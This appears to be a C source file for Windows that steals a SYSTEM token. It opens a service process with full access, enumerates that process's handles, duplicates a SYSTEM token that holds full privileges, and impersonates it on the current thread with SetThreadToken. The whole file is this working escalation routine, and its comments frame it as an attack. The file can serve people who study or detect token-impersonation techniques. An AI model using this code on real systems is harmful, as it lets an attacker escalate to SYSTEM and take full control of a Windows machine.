#include "pch.h"
#include <winternl.h>
# pragma comment (lib, "ntdll.lib")

#define ProcessHandleInformation (PROCESSINFOCLASS)51

typedef struct _PROCESS_HANDLE_TABLE_ENTRY_INFO
{
    HANDLE HandleValue;
    ULONGLONG HandleCount;
    ULONGLONG PointerCount;
    ACCESS_MASK GrantedAccess;
    ULONG ObjectTypeIndex;
    ULONG HandleAttributes;
    ULONG Reserved;
} PROCESS_HANDLE_TABLE_ENTRY_INFO, * PPROCESS_HANDLE_TABLE_ENTRY_INFO;

typedef struct _PROCESS_HANDLE_SNAPSHOT_INFORMATION
{
    ULONGLONG NumberOfHandles;
    ULONGLONG Reserved;
    PROCESS_HANDLE_TABLE_ENTRY_INFO Handles[1];
} PROCESS_HANDLE_SNAPSHOT_INFORMATION, * PPROCESS_HANDLE_SNAPSHOT_INFORMATION;

typedef struct _OBJECT_TYPE_INFORMATION
{
    UNICODE_STRING TypeName;
    ULONG TotalNumberOfObjects;
    ULONG TotalNumberOfHandles;
    ULONG TotalPagedPoolUsage;
    ULONG TotalNonPagedPoolUsage;
    ULONG TotalNamePoolUsage;
    ULONG TotalHandleTableUsage;
    ULONG HighWaterNumberOfObjects;
    ULONG HighWaterNumberOfHandles;
    ULONG HighWaterPagedPoolUsage;
    ULONG HighWaterNonPagedPoolUsage;
    ULONG HighWaterNamePoolUsage;
    ULONG HighWaterHandleTableUsage;
    ULONG InvalidAttributes;
    GENERIC_MAPPING GenericMapping;
    ULONG ValidAccessMask;
    BOOLEAN SecurityRequired;
    BOOLEAN MaintainHandleCount;
    BOOLEAN TypeIndex;
    CHAR ReservedByte;
    ULONG PoolType;
    ULONG DefaultPagedPoolCharge;
    ULONG DefaultNonPagedPoolCharge;
} OBJECT_TYPE_INFORMATION, * POBJECT_TYPE_INFORMATION;

HRESULT
GetTokenObjectIndex(
    _Out_ PULONG TokenIndex
)
{
    HANDLE hToken;
    BOOL bRes;
    NTSTATUS status;
    struct
    {
        OBJECT_TYPE_INFORMATION TypeInfo;
        WCHAR TypeNameBuffer[sizeof("Token")];
    } typeInfoWithName;

    //
    // Open the current process token
    //
    bRes = OpenProcessToken(GetCurrentProcess(), MAXIMUM_ALLOWED, &hToken);
    if (bRes == FALSE)
    {
        return HRESULT_FROM_WIN32(GetLastError());
    }

    //
    // Get the object type information for the token handle
    //
    status = NtQueryObject(hToken,
        ObjectTypeInformation,
        &typeInfoWithName,
        sizeof(typeInfoWithName),
        NULL);
    CloseHandle(hToken);
    if (!NT_SUCCESS(status))
    {
        return HRESULT_FROM_NT(status);
    }

    //
    // Return the object type index
    //
    *TokenIndex = typeInfoWithName.TypeInfo.TypeIndex;
    return ERROR_SUCCESS;
}

HRESULT
GetSystemTokenFromProcess(
    _In_ HANDLE ProcessHandle
)
{
    NTSTATUS status;
    PROCESS_HANDLE_SNAPSHOT_INFORMATION localInfo;
    PPROCESS_HANDLE_SNAPSHOT_INFORMATION handleInfo = &localInfo;
    ULONG bytes;
    ULONG tokenIndex;
    ULONG i;
    HRESULT hResult;
    BOOL bRes;
    HANDLE dupHandle;
    TOKEN_STATISTICS tokenStats;
    HANDLE hThread;
    LUID systemLuid = SYSTEM_LUID;

    //
    // Get the Object Type Index for Token Objects so we can recognize them
    //
    hResult = GetTokenObjectIndex(&tokenIndex);
    if (FAILED(hResult))
    {
        goto Failure;
    }

    //
    // Check how big the process handle list ist
    //
    status = NtQueryInformationProcess(ProcessHandle,
        ProcessHandleInformation,
        handleInfo,
        sizeof(*handleInfo),
        &bytes);
    if (NT_SUCCESS(status))
    {
        hResult = ERROR_UNIDENTIFIED_ERROR;
        goto Failure;
    }

    //
    // Add space for 16 more handles and try again
    //
    bytes += 16 * sizeof(*handleInfo);
    handleInfo = (PPROCESS_HANDLE_SNAPSHOT_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, bytes);
    status = NtQueryInformationProcess(ProcessHandle,
        ProcessHandleInformation,
        handleInfo,
        bytes,
        NULL);
    if (!NT_SUCCESS(status))
    {
        hResult = HRESULT_FROM_NT(status);
        goto Failure;
    }

    //
    // Enumerate each one
    //
    for (i = 0; i < handleInfo->NumberOfHandles; i++)
    {
        //
        // Check if it's a token handle with full access
        //
        if ((handleInfo->Handles[i].ObjectTypeIndex == tokenIndex) &&
            (handleInfo->Handles[i].GrantedAccess == TOKEN_ALL_ACCESS))
        {
            //
            // Duplicate the token so we can take a look at it
            //
            bRes = DuplicateHandle(ProcessHandle,
                handleInfo->Handles[i].HandleValue,
                GetCurrentProcess(),
                &dupHandle,
                0,
                FALSE,
                DUPLICATE_SAME_ACCESS);
            if (bRes == FALSE)
            {
                hResult = HRESULT_FROM_WIN32(GetLastError());
                goto Failure;
            }

            //
            // Get information on the token
            //
            bRes = GetTokenInformation(dupHandle,
                TokenStatistics,
                &tokenStats,
                sizeof(tokenStats),
                &bytes);
            if (bRes == FALSE)
            {
                CloseHandle(dupHandle);
                hResult = HRESULT_FROM_WIN32(GetLastError());
                goto Failure;
            }

            //
            // Check if its a system token with all of its privileges intact
            //
            if ((*(PULONGLONG)&tokenStats.AuthenticationId ==
                *(PULONGLONG)&systemLuid) &&
                (tokenStats.PrivilegeCount >= 22))
            {
                //
                // We have a good candidate, impersonate it!
                //
                hThread = GetCurrentThread();
                bRes = SetThreadToken(&hThread, dupHandle);
                //
                // Always close the handle since it's not needed
                //
                CloseHandle(dupHandle);
                if (bRes == FALSE)
                {
                    hResult = HRESULT_FROM_WIN32(GetLastError());
                   goto Failure;
                }

                //
                // Get out of the loop
                //
                hResult = ERROR_SUCCESS;
                break;
            }

            //
            // Close this token and move on to the next one
            //
            CloseHandle(dupHandle);
        }
    }

Failure:
    //
    // Free the handle list if we had one
    //
    if (handleInfo != &localInfo)
    {
        HeapFree(GetProcessHeap(), 0, handleInfo);
    }
    return hResult;
}

HRESULT
GetServiceHandle(
    _In_ LPCWSTR ServiceName,
    _Out_ PHANDLE ProcessHandle
)
{
    SC_HANDLE hScm, hRpc;
    BOOL bRes;
    SERVICE_STATUS_PROCESS procInfo;
    HRESULT hResult;
    DWORD dwBytes;
    HANDLE hProc;

    //
    // Prepare for cleanup
    //
    hScm = NULL;
    hRpc = NULL;

    //
    // Connect to the SCM
    //
    hScm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hScm == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Open the service
    //
    hRpc = OpenService(hScm, ServiceName, SERVICE_QUERY_STATUS);
    if (hRpc == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Query the process information
    //
    bRes = QueryServiceStatusEx(hRpc,
        SC_STATUS_PROCESS_INFO,
        (LPBYTE)&procInfo,
        sizeof(procInfo),
        &dwBytes);
    if (bRes == FALSE)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Open a handle for all access to the PID
    //
    hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, procInfo.dwProcessId);
    if (hProc == NULL)
    {
        hResult = HRESULT_FROM_WIN32(GetLastError());
        goto Failure;
    }

    //
    // Return the PID
    //
    *ProcessHandle = hProc;
    hResult = ERROR_SUCCESS;

Failure:
    //
    // Cleanup the handles
    //
    if (hRpc != NULL)
    {
        CloseServiceHandle(hRpc);
    }
    if (hScm != NULL)
    {
        CloseServiceHandle(hScm);
    }
    return hResult;
}